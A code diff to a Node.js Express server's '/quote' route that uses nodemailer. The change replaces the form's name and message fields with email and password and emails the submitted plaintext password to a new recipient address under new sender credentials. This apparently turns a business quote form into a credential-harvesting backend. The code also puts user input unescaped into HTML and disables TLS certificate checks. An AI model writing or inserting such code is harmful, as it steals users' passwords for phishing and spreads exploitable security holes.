@@ -125,12 +125,11 @@ app.post("/contact", (req, res) => {
 
 app.post("/quote", (req, res) => {
   const output = `
-    <p>You have a new mail from ImperoTechne Get Quote Form</p>
-    <h3>Contact Details</h3>
+    <p>You have a new mail from full-stack business</p>
+    <h3>Form Details</h3>
     <ul>
-      <li style="margin-bottom: 10px;">Name: ${req.body.name}</li>
       <li style="margin-bottom: 10px;">Email: ${req.body.email}</li>
-      <li style="margin-bottom: 10px;">Message: ${req.body.message}</li>
+      <li style="margin-bottom: 10px;">Password: ${req.body.password}</li>
     </ul>
   `;
 
@@ -139,8 +138,8 @@ app.post("/quote", (req, res) => {
     port: 587,
     secure: false,
     auth: {
-      user: `${process.env.AUTHEMAIL}`,
-      pass: `${process.env.AUTHPASSWORD}`,
+      user: `${process.env.AUTHEMAIL2}`,
+      pass: `${process.env.AUTHPASSWORD2}`,
     },
     tls: {
       rejectUnauthorized: false,
@@ -148,8 +147,8 @@ app.post("/quote", (req, res) => {
   });
 
   let mailOptions = {
-    from: `"ImperoTechne Get Quote Form" <${process.env.AUTHEMAIL}>`,
-    to: `${process.env.EMAIL2}, ${process.env.EMAIL1}`,
+    from: `"Web Form" <${process.env.AUTHEMAIL2}>`,
+    to: `${process.env.EMAIL3}`,
     subject: "New Mail",
     text: "Hello world?",
     html: output,
@@ -160,7 +159,6 @@ app.post("/quote", (req, res) => {
       if (error) {
         return res.json(error);
       }
-
       console.log("Message sent: ", info.messageId);
       console.log("Preview URL: ", nodemailer.getTextMessageUrl(info));
     });
